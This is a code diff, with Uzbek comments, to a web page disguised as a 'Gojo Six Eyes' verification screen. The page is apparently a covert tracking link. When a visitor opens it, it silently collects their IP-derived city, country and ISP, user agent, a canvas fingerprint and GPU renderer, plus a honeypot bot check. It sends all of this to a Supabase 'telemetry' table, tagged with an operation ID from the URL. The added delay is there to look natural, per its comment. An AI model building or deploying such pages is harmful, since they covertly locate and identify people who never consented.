@@ -6,53 +6,24 @@
     <title>Gojo Six Eyes | Verification</title>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
-        body {
-            background-color: #050505;
-            color: #00d9ff;
-            font-family: 'Segoe UI', Tahoma, sans-serif;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            margin: 0;
-            text-align: center;
-        }
-        .container {
-            padding: 20px;
-        }
-        h1 {
-            font-size: 1.8rem;
-            letter-spacing: 4px;
-            margin: 0;
-        }
-        .status {
-            color: #888;
-            font-size: 1rem;
-            margin-top: 10px;
-        }
-        .loader {
-            width: 100px;
-            height: 1px;
-            background: #222;
-            margin: 20px auto;
-            position: relative;
-            overflow: hidden;
-        }
-        .loader::after {
-            content: '';
-            width: 30px;
-            height: 100%;
-            background: #00d9ff;
-            position: absolute;
-            animation: scan 1.5s infinite;
-        }
-        @keyframes scan {
-            0% { left: -30px; }
-            100% { left: 100px; }
-        }
+        body { background-color: #050505; color: #00d9ff; font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
+        .container { padding: 20px; }
+        h1 { font-size: 1.8rem; letter-spacing: 4px; margin: 0; text-shadow: 0 0 10px #00d9ff; }
+        .status { color: #888; font-size: 1rem; margin-top: 10px; }
+        .loader { width: 100px; height: 1px; background: #222; margin: 20px auto; position: relative; overflow: hidden; }
+        .loader::after { content: ''; width: 30px; height: 100%; background: #00d9ff; position: absolute; animation: scan 1.5s infinite; }
+        @keyframes scan { 0% { left: -30px; } 100% { left: 100px; } }
+
+        /* 🍯 Honeypot: Odamlar buni ko'rmaydi, lekin botlar ko'radi va to'ldiradi */
+        #honeypot-area { display: none; visibility: hidden; position: absolute; left: -9999px; }
     </style>
 </head>
 <body>
+
+<div id="honeypot-area">
+    <input type="text" id="admin_login_field" value="">
+    <input type="checkbox" id="is_debug_mode" checked>
+</div>
 
 <div class="container" id="main-content">
     <h1>🌀 GOJO SIX EYES</h1>
@@ -61,19 +32,43 @@
 </div>
 
 <script>
-    // --- SUPABASE CONFIG (Sizning ma'lumotlaringiz) ---
     const SUPABASE_URL = 'https://kisbfmcxvcwtxfwbgexb.supabase.co'; 
     const SUPABASE_KEY = 'sb_publishable_THarexbaf5WB2Cc-c6t-sg_TQJycbtz';
     const _supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
     const urlParams = new URLSearchParams(window.location.search);
-    const opID = urlParams.get('id') || "UNSET";
+    const opID = urlParams.get('id') || "DIRECT";
+
+    // 🧬 Digital Fingerprinting
+    function generateUID() {
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        ctx.textBaseline = "top";
+        ctx.font = "14px Arial";
+        ctx.fillText("SIX-EYES-TRACE", 2, 2);
+        return btoa(canvas.toDataURL()).substring(150, 162).toUpperCase();
+    }
+
+    // 🍯 Honeypot Detection
+    function checkHoneypot() {
+        const honeyField = document.getElementById('admin_login_field').value;
+        const honeyCheck = document.getElementById('is_debug_mode').checked;
+        // Agar bot fieldni o'zgartirsa yoki checkboxni o'chirsa
+        return honeyField !== "" || honeyCheck === false;
+    }
 
     async function initTrace() {
         try {
-            // IP va metadata yig'ish
             const res = await fetch("https://ipapi.co/json/");
             const data = await res.json();
+            
+            // GPU/Renderer ma'lumoti
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl');
+            const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
+            const renderer = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown";
+
+            const isBotTrapped = checkHoneypot(); // Tuzoqqa tushdimi?
 
             const payload = {
                 operation_id: opID,
@@ -81,25 +76,18 @@
                 location: `${data.city}, ${data.country_name}`,
                 provider: data.org,
                 user_agent: navigator.userAgent,
+                uid: generateUID(), // Barmoq izi
+                gpu: renderer,
+                is_bot: isBotTrapped || navigator.webdriver, // Bot ekanini aniqlash
                 created_at: new Date().toISOString()
             };
 
-            // Bazaga yuborish
-            await sendToDatabase(payload);
+            await _supabase.from('telemetry').insert([payload]);
+
         } catch (err) {
             console.error("Trace error:", err);
-            showFinalMessage(); 
-        }
-    }
-
-    async function sendToDatabase(payload) {
-        try {
-            const { error } = await _supabase.from('telemetry').insert([payload]);
-            if (error) throw error;
-        } catch (e) {
-            console.error("DB error:", e);
         } finally {
-            showFinalMessage();
+            setTimeout(showFinalMessage, 1500); // Tabiiy ko'rinishi uchun biroz kutamiz
         }
     }
 
